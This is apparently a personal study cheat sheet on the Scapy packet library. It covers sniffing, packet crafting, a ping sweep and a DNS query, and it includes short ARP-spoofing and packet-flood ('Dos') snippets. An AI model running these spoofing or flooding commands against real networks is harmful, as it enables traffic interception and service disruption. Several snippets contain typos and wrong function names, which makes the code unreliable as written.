- scapy is basically a network sniffer and packet manipulator

# Import Scapy 
```bash
sudo python3

```

```python
from scapy.all import *          
pkt = sniff(filter ="ether dst (macid)", count=1)   #spanning tree protocol
pkt[0]           #see the frame     0 for 1, 1 for 2 etc..
pkt[0].show()    #better view of the frame
pkt[0][#].show()  # "#"  specifies what layer to view in TCP model
```

# Basic Scapy 
#### Capture a packet 
- ex = sniff(count = 10)
- filter ="(protocol)" 
- count = (variable)
- iface = "interface"
#### Read the packet
- ex.summary()
- ex[0].show()
- ex[0]
- `print(ex[0][IP].src)`   `print(ex.[0][IP].dst`
#### Create a packet 
- ex = IP(dst="IP")  / protocol ()
- send(ex)
#### Ping Sweep
```python
for i in range(1,255):
	packet = IP(dsct=f"IPaddr") / protocol()
	response = srl(packet, timeout=1, verbose=False)
	if response:
		print(f"host is active")
```
#### Arp Spoofing

```python
target_ip = "IP"
gateway_ip = "ip.1"
fake_arp = Arp(op=2, pdst=target_ip, psrc=gateway_ip)
send(fake_arp, loop=1, verbose=False)
```
#### Dns Query

```python
packet = IP(dst="dns_ip") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))

responce = srl(packet)
print(respinse[DNS].summary())
```

# Using GUI 
## Create a Packet 
- ` send(IP(src="src_ip", dst="dst_ip")/ICMP()/"your message")`
## Sniff a packet 
- `sniff(iface="interface", prn=lambda x:x.summary(), filter="protocol"count="number") `
## Dos 
- `send(IP(src="src_ip", dst="dst_ip")/TCP(sport=#, dport=#), count=number)`
